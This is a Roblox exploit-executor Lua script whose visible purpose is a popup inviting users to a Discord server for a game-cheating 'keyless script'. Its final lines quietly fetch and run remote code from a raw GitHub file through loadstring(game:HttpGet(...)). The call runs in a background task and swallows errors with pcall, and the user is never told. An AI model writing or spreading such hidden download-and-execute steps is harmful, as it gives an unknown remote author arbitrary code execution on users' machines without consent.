if not _G.LoadedUBJoiner then _G.LoadedUBJoiner = true end

local gui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local corner = Instance.new("UICorner")
local titlebar = Instance.new("Frame")
local corner2 = Instance.new("UICorner")
local label = Instance.new("TextLabel")
local divider = Instance.new("Frame")
local btnContainer = Instance.new("Frame")
local copyBtn = Instance.new("TextButton")
local corner3 = Instance.new("UICorner")
local exitBtn = Instance.new("TextButton")
local corner4 = Instance.new("UICorner")

gui.Name = "DiscordJoiner"
gui.Parent = (gethui() or cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui"))
gui.ResetOnSpawn = false

frame.Name = "JoinerFrame"
frame.Parent = gui
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Position = UDim2.new(0.5, -175, 0.5, -125)
frame.Size = UDim2.new(0, 350, 0, 250)
frame.Draggable = true
frame.Active = true

corner.Parent = frame
corner.CornerRadius = UDim.new(0, 8)

titlebar.Name = "TitleBar"
titlebar.Parent = frame
titlebar.BackgroundColor3 = Color3.fromRGB(54, 57, 63)
titlebar.BorderSizePixel = 0
titlebar.Size = UDim2.new(1, 0, 0, 40)

corner2.Parent = titlebar
corner2.CornerRadius = UDim.new(0, 8)

label.Name = "DiscordLabel"
label.Parent = frame
label.BackgroundTransparency = 1
label.Position = UDim2.new(0.5, 0, 0.3, 0)
label.Size = UDim2.new(0.8, 0, 0, 70)
label.Font = Enum.Font.GothamSemibold
label.Text = "Join our community to make suggestions and help us become the #1 keyless script! We support OVER 15 games"
label.TextColor3 = Color3.fromRGB(220, 220, 220)
label.TextSize = 16
label.TextWrapped = true
label.AnchorPoint = Vector2.new(0.5, 0)

divider.Name = "Divider"
divider.Parent = frame
divider.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
divider.BorderSizePixel = 0
divider.Position = UDim2.new(0, 0, 0.6, 0)
divider.Size = UDim2.new(1, 0, 0, 1)

btnContainer.Name = "ButtonContainer"
btnContainer.Parent = frame
btnContainer.BackgroundTransparency = 1
btnContainer.Position = UDim2.new(0, 0, 0.65, 0)
btnContainer.Size = UDim2.new(1, 0, 0, 80)

copyBtn.Name = "CopyButton"
copyBtn.Parent = btnContainer
copyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
copyBtn.Position = UDim2.new(0.1, 0, 0.1, 0)
copyBtn.Size = UDim2.new(0.35, 0, 0.8, 0)
copyBtn.Font = Enum.Font.Gotham
copyBtn.Text = "Copy Invite"
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.TextSize = 14
copyBtn.AutoButtonColor = false

corner3.Parent = copyBtn
corner3.CornerRadius = UDim.new(0, 4)

exitBtn.Name = "ExitButton"
exitBtn.Parent = btnContainer
exitBtn.BackgroundColor3 = Color3.fromRGB(54, 57, 63)
exitBtn.Position = UDim2.new(0.55, 0, 0.1, 0)
exitBtn.Size = UDim2.new(0.35, 0, 0.8, 0)
exitBtn.Font = Enum.Font.Gotham
exitBtn.Text = "Close"
exitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
exitBtn.TextSize = 14
exitBtn.AutoButtonColor = false

corner4.Parent = exitBtn
corner4.CornerRadius = UDim.new(0, 4)

local function copyInvite()
    local link = "https://discord.gg/pn8xyhuSeV"
    copyBtn.Text = "Copying..."
    copyBtn.BackgroundColor3 = Color3.fromRGB(66, 77, 181)
    wait(0.3)
    setclipboard(link)
    copyBtn.Text = "Copied!"
    copyBtn.BackgroundColor3 = Color3.fromRGB(59, 165, 92)
    task.delay(2, function()
        copyBtn.Text = "Copy Invite"
        copyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    end)
end

local function closeGui()
    for i = 1, 0, -0.05 do
        frame.BackgroundTransparency = 1 - i
        titlebar.BackgroundTransparency = 1 - i
        label.TextTransparency = 1 - i
        copyBtn.TextTransparency = 1 - i
        exitBtn.TextTransparency = 1 - i
        wait(0.01)
    end
    gui:Destroy()
end

local function hoverEffect(btn, color)
    local orig = btn.BackgroundColor3
    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = color end) 
    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = orig end)
end

hoverEffect(copyBtn, Color3.fromRGB(71, 82, 196))
hoverEffect(exitBtn, Color3.fromRGB(66, 69, 74))

copyBtn.MouseButton1Click:Connect(copyInvite)
exitBtn.MouseButton1Click:Connect(closeGui)

frame.BackgroundTransparency = 1
titlebar.BackgroundTransparency = 1
label.TextTransparency = 1
copyBtn.TextTransparency = 1
exitBtn.TextTransparency = 1

for i = 0, 1, 0.05 do
    frame.BackgroundTransparency = 1 - i
    titlebar.BackgroundTransparency = 1 - i
    label.TextTransparency = 1 - i
    copyBtn.TextTransparency = 1 - i
    exitBtn.TextTransparency = 1 - i
    wait(0.01)
end

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/rhuda21/Main/refs/heads/main/Executed.lua"))()
    end)
end)
